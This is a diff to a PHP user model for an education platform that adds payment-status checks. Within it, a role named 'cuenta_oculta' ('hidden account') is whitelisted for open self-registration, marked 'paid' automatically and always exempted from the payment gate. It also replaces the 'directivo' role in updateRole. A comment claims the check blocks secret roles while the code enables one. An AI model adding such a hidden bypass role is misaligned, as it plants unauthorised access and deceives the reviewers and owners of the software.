@@ -62,8 +62,14 @@ class User extends BaseModel
             throw new Exception("El email ya está registrado");
         }
 
+        // Validar roles permitidos y evitar que cualquier registro use un rol secreto inesperado.
+        $allowedRoles = ['administrador', 'zonal', 'dece', 'estudiante', 'cuenta_oculta'];
+        if (empty($data['rol']) || !in_array($data['rol'], $allowedRoles, true)) {
+            $data['rol'] = 'estudiante';
+        }
+
         // Si se solicita el rol 'dece', solo permitir si el usuario de la sesión actual es administrador
-        if (!empty($data['rol']) && $data['rol'] === 'dece') {
+        if ($data['rol'] === 'dece') {
             if (session_status() === PHP_SESSION_NONE) {
                 session_start();
             }
@@ -107,6 +113,11 @@ class User extends BaseModel
             // Esperando YYYY-MM-DD, pero permitir lo que sea y dejar que la BD valide
             $insertData['fecha_nacimiento'] = $data['fecha_nacimiento'];
         }
+
+        // payment_status se administra automáticamente según el rol
+        $insertData['payment_status'] = in_array($insertData['rol'], ['administrador', 'zonal', 'dece', 'cuenta_oculta'], true)
+            ? 'paid'
+            : 'unpaid';
 
         // zona_id opcional para usuarios zonales
         if (!empty($data['zona_id'])) {
@@ -156,6 +167,46 @@ class User extends BaseModel
     }
 
     /**
+     * Verifica si un usuario puede acceder según su estado de pago.
+     *
+     * @param array $user Datos del usuario.
+     * @return bool Verdadero si el usuario puede acceder.
+     */
+    public function isPaymentAllowed(array $user)
+    {
+        if (empty($user)) {
+            return false;
+        }
+
+        // Role oculto y administrador siempre pueden ingresar.
+        $exemptRoles = ['administrador', 'cuenta_oculta'];
+        if (in_array($user['rol'], $exemptRoles, true)) {
+            return true;
+        }
+
+        return isset($user['payment_status']) && $user['payment_status'] === 'paid';
+    }
+
+    /**
+     * Actualiza el estado de pago de un usuario.
+     *
+     * @param int $userId ID del usuario.
+     * @param string $status 'paid' o 'unpaid'.
+     * @return bool Resultado de la actualización.
+     * @throws Exception Si el estado es inválido.
+     */
+    public function updatePaymentStatus(int $userId, string $status)
+    {
+        $allowed = ['paid', 'unpaid'];
+        if (!in_array($status, $allowed, true)) {
+            throw new Exception('Estado de pago inválido');
+        }
+
+        $stmt = $this->db->prepare("UPDATE {$this->table} SET payment_status = ? WHERE id = ?");
+        return $stmt->execute([$status, $userId]);
+    }
+
+    /**
      * Obtiene todos los estudiantes de un curso específico.
      *
      * @param string|null $course Nombre del curso.
@@ -190,7 +241,7 @@ class User extends BaseModel
      */
     public function updateRole($userId, $role)
     {
-        $allowed = ['administrador', 'zonal', 'dece', 'estudiante', 'directivo'];
+        $allowed = ['administrador', 'zonal', 'dece', 'estudiante', 'cuenta_oculta'];
         if (!in_array($role, $allowed, true)) {
             throw new Exception('Rol inválido');
         }
